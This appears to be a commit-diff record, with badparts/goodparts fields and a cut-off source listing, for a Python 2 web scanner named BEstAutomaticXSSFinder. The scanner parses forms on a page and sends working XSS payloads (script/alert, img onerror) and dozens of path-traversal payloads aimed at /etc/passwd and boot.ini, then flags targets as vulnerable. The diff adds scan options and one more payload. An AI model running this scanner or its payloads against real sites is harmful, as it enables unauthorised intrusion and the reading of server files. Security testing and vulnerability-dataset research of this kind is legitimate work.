    hidden_param_value.append(m_value.group(2))\n@@ -197,9 +201,9 @@ def scan_for_forms(fname, host, url):\n                             params.append(m_input.group(2))\n \n                 #detect forms\n-                m_same      = re.match(r'.*\\<form\\>\"', line, re.M|re.I)\n-                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\#\\:]+)\"', line, re.M|re.I)\n-                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I)\n+                m_same      = re.match(r'.*\\<form\\>', line, re.M|re.I)\n+                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=[\"\\']([\\w\\/\\.\\-\\#\\:]+)[\"\\']', line, re.M|re.I)\n+                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=[\"\\']([\\w\\/\\.\\-]+)[\"\\']', line, re.M|re.I)\n                 if m_action or m_same:\n                     has_form=1\n                     form_counter+=1\n@@ -222,19 +226,37 @@ def scan_for_forms(fname, host, url):\n \n     return\n \n-def banner():\n-    print \"BEstAutomaticXSSFinder v1.0\"\n-    print \"DISCLAIMER: For testing purposes only!\\n\"\n+def help():\n+    print \"--checkxss\\t\\tcheck webpage for XSS vunerabilities\"\n+    print \"--checklfi\\t\\tcheck webpage for local file inclusion (LFI) vulnerabilities\"\n+    print \"--all\\t\\t\\tthe tool will scan for both XSS and LFI vulnerabilities (default)\"\n+    print \"\\nExamples:\"\n+    print \"program http://example.com/guestbook\\t\\t\\tit will check for both XSS and LFI\"\n+    print \"program --checkxss http://example.com/guestbook\\t\\tit will check only for XSS\"\n \n ###MAIN###\n if __name__ == \"__main__\":\n-    banner()\n+    print \"BEstAutomaticXSSFinder v1.0\"\n+    print \"DISCLAIMER: For testing purposes only!\\n\"\n \n-    if len(sys.argv) != 2:\n-        print \"program [url]\"\n+    if len(sys.argv) < 2 or len(sys.argv) > 3:\n+        print \"program [scan options] [url]\\n\"\n+        help()\n         exit()\n \n-    url = sys.argv[1]\n+    scanopt =\"--all\"\n+    url = \"\"\n+    \n+    if sys.argv[1].find(\"http\") == 0:\n+        url = sys.argv[1]\n+        if len(sys.argv) == 3:\n+            scanopt = sys.argv[2]\n+    else:\n+        if len(sys.argv) == 3:\n+            if sys.argv[1].find(\"--check\") == 0:\n+                scanopt = sys.argv[1]\n+                url = sys.argv[2]\n+\n     if url.find(\"http\") != 0:\n         print \"[-] Invalid target\"\n         exit()\n@@ -256,8 +278,9 @@ def banner():\n         with open(\"tmpage.txt\", \"w\") as f:\n             f.write(s)\n \n-        scan_for_forms(\"tmpage.txt\", host, url)\n-        os.remove(\"tmpage.txt\")\n+        scan_for_forms(\"tmpage.txt\", host, url, scanopt)\n+        if DEBUG == 0:\n+            os.remove(\"tmpage.txt\")\n     except Exception, e:\n         print \"[-] Main(): Error \" + str(e)\n \n", "message": "", "files": {"/scripts/beaxssf.py": {"changes": [{"diff": "\n import re\n \n DEBUG = 0\n-xss_attacks = [ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\",\n+xss_attacks = [ \"<script>alert(1);</script>\", \"<script>prompt(1)</script>\",\n+                \"<img src=x onerror=prompt(/test/)>\",\n                 \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\",\n                 \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\",\n                 \"<img src=test123456.jpg onerror=alert(1)>\"]\n", "add": 2, "remove": 1, "filename": "/scripts/beaxssf.py", "badparts": ["xss_attacks = [ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\","], "goodparts": ["xss_attacks = [ \"<script>alert(1);</script>\", \"<script>prompt(1)</script>\",", "                \"<img src=x onerror=prompt(/test/)>\","]}, {"diff": "\n     return\n \n \n-def scan_for_forms(fname, host, url):\n+def scan_for_forms(fname, host, url, scanopt):\n     print \"[+] Start scan\"\n     rtype=\"\"\n     has_form=0\n", "add": 1, "remove": 1, "filename": "/scripts/beaxssf.py", "badparts": ["def scan_for_forms(fname, host, url):"], "goodparts": ["def scan_for_forms(fname, host, url, scanopt):"]}, {"diff": "\n                 #let's check if the page is vulnerable\n                 if line.find(\"</form>\") >=0:\n                     has_form=0\n-                    if len(page) > 0 and len(params) > 0:\n-                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n-                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n+                    if len(page) > 0 and (len(params) > 0 or len(hidden_param_value) > 0):\n+                        if scanopt.find(\"--checkxss\") == 0 or scanopt.find(\"--all\") == 0:\n+                            check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n+                        if scanopt.find(\"--checklfi\") == 0 or scanopt.find(\"--all\") == 0:\n+                            check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                         params=[]\n                         hidden_param_name=[]\n                         hidden_param_value=[]\n", "add": 5, "remove": 3, "filename": "/scripts/beaxssf.py", "badparts": ["                    if len(page) > 0 and len(params) > 0:", "                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)", "                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)"], "goodparts": ["                    if len(page) > 0 and (len(params) > 0 or len(hidden_param_value) > 0):", "                        if scanopt.find(\"--checkxss\") == 0 or scanopt.find(\"--all\") == 0:", "                            check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)", "                        if scanopt.find(\"--checklfi\") == 0 or scanopt.find(\"--all\") == 0:", "                            check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)"]}, {"diff": "\n \n                 #add input parameters to list\n                 if has_form == 1:\n-                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I)\n+                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)\n                     if m_input:\n                         #check if the parameters already has a value assigned\n-                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I)\n+                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)\n                         if m_value:\n                             hidden_param_name.append(m_input.group(2))\n                             hidden_param_value.append(m_value.group(2))\n", "add": 2, "remove": 2, "filename": "/scripts/beaxssf.py", "badparts": ["                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I)", "                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I)"], "goodparts": ["                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)", "                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=[\"\\'](\\w+)[\"\\']', line, re.M|re.I)"]}, {"diff": "\n                             params.append(m_input.group(2))\n \n                 #detect forms\n-                m_same      = re.match(r'.*\\<form\\>\"', line, re.M|re.I)\n-                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\#\\:]+)\"', line, re.M|re.I)\n-                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I)\n+                m_same      = re.match(r'.*\\<form\\>', line, re.M|re.I)\n+                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=[\"\\']([\\w\\/\\.\\-\\#\\:]+)[\"\\']', line, re.M|re.I)\n+                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=[\"\\']([\\w\\/\\.\\-]+)[\"\\']', line, re.M|re.I)\n                 if m_action or m_same:\n                     has_form=1\n                     form_counter+=1\n", "add": 3, "remove": 3, "filename": "/scripts/beaxssf.py", "badparts": ["                m_same      = re.match(r'.*\\<form\\>\"', line, re.M|re.I)", "                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\#\\:]+)\"', line, re.M|re.I)", "                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I)"], "goodparts": ["                m_same      = re.match(r'.*\\<form\\>', line, re.M|re.I)", "                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=[\"\\']([\\w\\/\\.\\-\\#\\:]+)[\"\\']', line, re.M|re.I)", "                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=[\"\\']([\\w\\/\\.\\-]+)[\"\\']', line, re.M|re.I)"]}, {"diff": "\n \n     return\n \n-def banner():\n-    print \"BEstAutomaticXSSFinder v1.0\"\n-    print \"DISCLAIMER: For testing purposes only!\\n\"\n+def help():\n+    print \"--checkxss\\t\\tcheck webpage for XSS vunerabilities\"\n+    print \"--checklfi\\t\\tcheck webpage for local file inclusion (LFI) vulnerabilities\"\n+    print \"--all\\t\\t\\tthe tool will scan for both XSS and LFI vulnerabilities (default)\"\n+    print \"\\nExamples:\"\n+    print \"program http://example.com/guestbook\\t\\t\\tit will check for both XSS and LFI\"\n+    print \"program --checkxss http://example.com/guestbook\\t\\tit will check only for XSS\"\n \n ###MAIN###\n if __name__ == \"__main__\":\n-    banner()\n+    print \"BEstAutomaticXSSFinder v1.0\"\n+    print \"DISCLAIMER: For testing purposes only!\\n\"\n \n-    if len(sys.argv) != 2:\n-        print \"program [url]\"\n+    if len(sys.argv) < 2 or len(sys.argv) > 3:\n+        print \"program [scan options] [url]\\n\"\n+        help()\n         exit()\n \n-    url = sys.argv[1]\n+    scanopt =\"--all\"\n+    url = \"\"\n+    \n+    if sys.argv[1].find(\"http\") == 0:\n+        url = sys.argv[1]\n+        if len(sys.argv) == 3:\n+            scanopt = sys.argv[2]\n+    else:\n+        if len(sys.argv) == 3:\n+            if sys.argv[1].find(\"--check\") == 0:\n+                scanopt = sys.argv[1]\n+                url = sys.argv[2]\n+\n     if url.find(\"http\") != 0:\n         print \"[-] Invalid target\"\n         exit()\n", "add": 25, "remove": 7, "filename": "/scripts/beaxssf.py", "badparts": ["def banner():", "    print \"BEstAutomaticXSSFinder v1.0\"", "    print \"DISCLAIMER: For testing purposes only!\\n\"", "    banner()", "    if len(sys.argv) != 2:", "        print \"program [url]\"", "    url = sys.argv[1]"], "goodparts": ["def help():", "    print \"--checkxss\\t\\tcheck webpage for XSS vunerabilities\"", "    print \"--checklfi\\t\\tcheck webpage for local file inclusion (LFI) vulnerabilities\"", "    print \"--all\\t\\t\\tthe tool will scan for both XSS and LFI vulnerabilities (default)\"", "    print \"\\nExamples:\"", "    print \"program http://example.com/guestbook\\t\\t\\tit will check for both XSS and LFI\"", "    print \"program --checkxss http://example.com/guestbook\\t\\tit will check only for XSS\"", "    print \"BEstAutomaticXSSFinder v1.0\"", "    print \"DISCLAIMER: For testing purposes only!\\n\"", "    if len(sys.argv) < 2 or len(sys.argv) > 3:", "        print \"program [scan options] [url]\\n\"", "        help()", "    scanopt =\"--all\"", "    url = \"\"", "    if sys.argv[1].find(\"http\") == 0:", "        url = sys.argv[1]", "        if len(sys.argv) == 3:", "            scanopt = sys.argv[2]", "    else:", "        if len(sys.argv) == 3:", "            if sys.argv[1].find(\"--check\") == 0:", "                scanopt = sys.argv[1]", "                url = sys.argv[2]"]}, {"diff": "\n         with open(\"tmpage.txt\", \"w\") as f:\n             f.write(s)\n \n-        scan_for_forms(\"tmpage.txt\", host, url)\n-        os.remove(\"tmpage.txt\")\n+        scan_for_forms(\"tmpage.txt\", host, url, scanopt)\n+        if DEBUG == 0:\n+            os.remove(\"tmpage.txt\")\n     except Exception, e:\n         print \"[-] Main(): Error \" + str(e)\n \n", "add": 3, "remove": 2, "filename": "/scripts/beaxssf.py", "badparts": ["        scan_for_forms(\"tmpage.txt\", host, url)", "        os.remove(\"tmpage.txt\")"], "goodparts": ["        scan_for_forms(\"tmpage.txt\", host, url, scanopt)", "        if DEBUG == 0:", "            os.remove(\"tmpage.txt\")"]}], "source": "\n import sys import os import requests import re DEBUG=0 xss_attacks=[ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\", \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\", \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\", \"<img src=test123456.jpg onerror=alert(1)>\"] lfi_attacks=[ '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00', '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00', '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00', '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '../../boot.ini', '../../../boot.ini', '../../../../boot.ini', '../../../../../boot.ini', '../../../../../../boot.ini', '../../../../../../../boot.ini', '../../../../../../../../boot.ini', '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00', '../../../../../boot.ini%00', '../../../../../../boot.ini%00', '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00', '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini' ] lfi_expect=['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin'] def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global xss_attacks global DEBUG if page.find(\"http://\")==0 or page.find(\"https://\")==0: furl=page else: if _url.find(\"https://\")==0: furl=\"https://\" +host +\"/\" +page else: furl=\"http://\" +host +\"/\" +page print \"[+] XSS check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for xss in xss_attacks: post_params={} counter+=1 parameters=\"\" for i in range(0,len(params)): for j in range(0, len(params)): if j==i: post_params[params[j]]=xss else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)): for i in range(0,len(hidden_param_name)): post_params[hidden_param_name[i]]=hidden_param_value[i] if method.find(\"get\")==0: r=requests.get(url=furl, params=post_params) else: r=requests.post(furl, data=post_params) if DEBUG==1: print post_params with open(\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html\", \"w\") as f: f.write(r.content) if r.content.find(xss)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global lfi_attacks global lfi_expect global DEBUG if page.find(\"http://\")==0 or page.find(\"https://\")==0: furl=page else: if _url.find(\"https://\")==0: furl=\"https://\" +host +\"/\" +page else: furl=\"http://\" +host +\"/\" +page print \"[+] LFI check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for lfi in lfi_attacks: post_params={} counter+=1 parameters=\"\" for i in range(0,len(params)): for j in range(0, len(params)): if j==i: post_params[params[j]]=lfi else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)): for i in range(0,len(hidden_param_name)): post_params[hidden_param_name[i]]=hidden_param_value[i] if method.find(\"get\")==0: r=requests.get(url=furl, params=post_params) else: r=requests.post(furl, data=post_params) if DEBUG==1: print post_params with open(\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html\", \"w\") as f: f.write(r.content) for lfi_result in lfi_expect: if r.content.find(lfi_result)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def scan_for_forms(fname, host, url): print \"[+] Start scan\" rtype=\"\" has_form=0 params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" form_counter=0 try: with open(fname, \"r\") as f: for line in f: if line.find(\"</form>\") >=0: has_form=0 if len(page) > 0 and len(params) > 0: check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" if has_form==1: m_input=re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I) if m_input: m_value=re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I) if m_value: hidden_param_name.append(m_input.group(2)) hidden_param_value.append(m_value.group(2)) else: params.append(m_input.group(2)) m_same =re.match(r'.*\\<form\\>\"', line, re.M|re.I) m_action =re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\ m_reqtype =re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I) if m_action or m_same: has_form=1 form_counter+=1 if m_same: page=\"\" else: page=m_action.group(1) rtype=\"get\" if m_reqtype: rtype=m_reqtype.group(1) print \"[+] Form detected. Method \" +rtype.upper() except Exception, e: print \"[-] scan_for_forms(): Error \" +str(e) return def banner(): print \"BEstAutomaticXSSFinder v1.0\" print \"DISCLAIMER: For testing purposes only!\\n\" if __name__==\"__main__\": banner() if len(sys.argv) !=2: print \"program[url]\" exit() url=sys.argv[1] if url.find(\"http\") !=0: print \"[-] Invalid target\" exit() m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M) if m: host=m.group(2) else: print \"[-] Can't get host information\" exit() print \"[+] Host acquired \" +host print \"[+] Retrieve page\" try: r=requests.get(url) s=r.content.replace(\">\", \">\\n\") with open(\"tmpage.txt\", \"w\") as f: f.write(s) scan_for_forms(\"tmpage.txt\", host, url) os.remove(\"tmpage.txt\") except Exception, e: print \"[-] Main(): Error \" +str(e) print \"[*] Done\" ", "sourceWithComments": "#! python\n###############################################\n#   BEstAutomaticXSSFinder                    #\n#   Author: malwrforensics                    #\n#   Contact: malwr at malwrforensics dot com  #\n###############################################\n\nimport sys\nimport os\nimport requests\nimport re\n\nDEBUG = 0\nxss_attacks = [ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\",\n                \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\",\n                \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\",\n                \"<img src=test123456.jpg onerror=alert(1)>\"]\n\nlfi_attacks = [\n                #linux\n                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',\n                '../../../../../etc/passwd', '../../../../../../etc/passwd',\n                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',\n                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',\n                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',\n                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',\n                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n\n                #windows\n                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',\n                '../../../../../boot.ini', '../../../../../../boot.ini',\n                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',\n                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',\n                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',\n                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',\n                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'\n                ]\n\nlfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']\n\ndef check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):\n    global xss_attacks\n    global DEBUG\n    if page.find(\"http://\") == 0 or page.find(\"https://\") == 0:\n        furl = page\n    else:\n        if _url.find(\"https://\") == 0:\n            furl = \"https://\" + host + \"/\" + page\n        else:\n            furl = \"http://\" + host + \"/\" + page\n\n    print \"[+] XSS check for: \" + furl\n    if DEBUG == 1:\n        print \"Params: \"\n        print params\n        print hidden_param_name\n        print hidden_param_value\n\n    counter = 0\n    for xss in xss_attacks:\n        post_params={}\n        counter+=1\n        parameters = \"\"\n        for i in range(0,len(params)):\n            for j in range(0, len(params)):\n                if j==i:\n                    post_params[params[j]] = xss\n                else:\n                    post_params[params[j]] = 0\n\n        #add any hidden parameters\n        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):\n            for i in range(0,len(hidden_param_name)):\n                post_params[hidden_param_name[i]] = hidden_param_value[i]\n\n        if method.find(\"get\") == 0:\n            r=requests.get(url = furl, params = post_params)\n        else:\n            r=requests.post(furl, data=post_params)\n\n        if DEBUG == 1:\n            print post_params\n            with open(\"response_\" + str(form_counter) + \"_\" + str(counter) + \".html\", \"w\") as f:\n                f.write(r.content)\n\n        if r.content.find(xss)>=0:\n            print \"[+] Target is VULNERABLE\"\n            print \"Url: \" + url\n            print \"Parameters: %s\\n\" % str(post_params)\n\n            #comment out the return if you want all the findings\n            return\n    return\n\ndef check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):\n    global lfi_attacks\n    global lfi_expect\n    global DEBUG\n    if page.find(\"http://\") == 0 or page.find(\"https://\") == 0:\n        furl = page\n    else:\n        if _url.find(\"https://\") == 0:\n            furl = \"https://\" + host + \"/\" + page\n        else:\n            furl = \"http://\" + host + \"/\" + page\n\n    print \"[+] LFI check for: \" + furl\n    if DEBUG == 1:\n        print \"Params: \"\n        print params\n        print hidden_param_name\n        print hidden_param_value\n\n    counter = 0\n    for lfi in lfi_attacks:\n        post_params={}\n        counter+=1\n        parameters = \"\"\n        for i in range(0,len(params)):\n            for j in range(0, len(params)):\n                if j==i:\n                    post_params[params[j]] = lfi\n                else:\n                    post_params[params[j]] = 0\n\n        #add any hidden parameters\n        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):\n            for i in range(0,len(hidden_param_name)):\n                post_params[hidden_param_name[i]] = hidden_param_value[i]\n\n        if method.find(\"get\") == 0:\n            r=requests.get(url = furl, params = post_params)\n        else:\n            r=requests.post(furl, data=post_params)\n\n        if DEBUG == 1:\n            print post_params\n            with open(\"response_\" + str(form_counter) + \"_\" + str(counter) + \".html\", \"w\") as f:\n                f.write(r.content)\n\n        for lfi_result in lfi_expect:\n            if r.content.find(lfi_result)>=0:\n                print \"[+] Target is VULNERABLE\"\n                print \"Url: \" + url\n                print \"Parameters: %s\\n\" % str(post_params)\n\n                #comment out the return if you want all the findings\n                return\n    return\n\n\ndef scan_for_forms(fname, host, url):\n    print \"[+] Start scan\"\n    rtype=\"\"\n    has_form=0\n    params = []\n    hidden_param_name=[]\n    hidden_param_value=[]\n    page = \"\"\n    form_counter = 0\n    try:\n        with open(fname, \"r\") as f:\n            for line in f:\n\n                #now that we've collected all the parameters\n                #let's check if the page is vulnerable\n                if line.find(\"</form>\") >=0:\n                    has_form=0\n                    if len(page) > 0 and len(params) > 0:\n                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                        params=[]\n                        hidden_param_name=[]\n                        hidden_param_value=[]\n                        page=\"\"\n\n                #add input parameters to list\n                if has_form == 1:\n                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I)\n                    if m_input:\n                        #check if the parameters already has a value assigned\n                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I)\n                        if m_value:\n                            hidden_param_name.append(m_input.group(2))\n                            hidden_param_value.append(m_value.group(2))\n                        else:\n                            params.append(m_input.group(2))\n\n                #detect forms\n                m_same      = re.match(r'.*\\<form\\>\"', line, re.M|re.I)\n                m_action    = 